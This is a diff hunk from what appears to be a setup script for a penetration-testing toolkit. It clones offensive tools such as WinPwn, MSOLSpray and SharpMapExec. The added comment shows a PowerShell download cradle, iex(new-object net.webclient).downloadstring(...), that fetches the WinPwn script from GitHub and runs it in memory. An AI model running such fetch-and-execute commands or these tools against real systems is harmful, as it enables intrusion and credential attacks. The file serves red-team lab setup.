@@ -60,6 +60,7 @@ git clone https://github.com/cube0x0/SharpMapExec.git c:\tools\sharpmapexec
 git clone https://github.com/Flangvik/NetLoader.git c:\tools\netloader
 git clone https://github.com/BloodHoundAD/AzureHound c:\tools\azurehound
 git clone https://github.com/nyxgeek/o365recon.git c:\tools\office365recon
+# To Execute WinPWN Import-Module .\WinPwn.ps1 Or iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
 git clone https://github.com/S3cur3Th1sSh1t/WinPwn.git c:\tools\winpwn
 git clone https://github.com/dafthack/MSOLSpray.git c:\tools\msolspray
 git clone https://github.com/offensive-security/exploitdb.git c:\tools\exploitdb-source
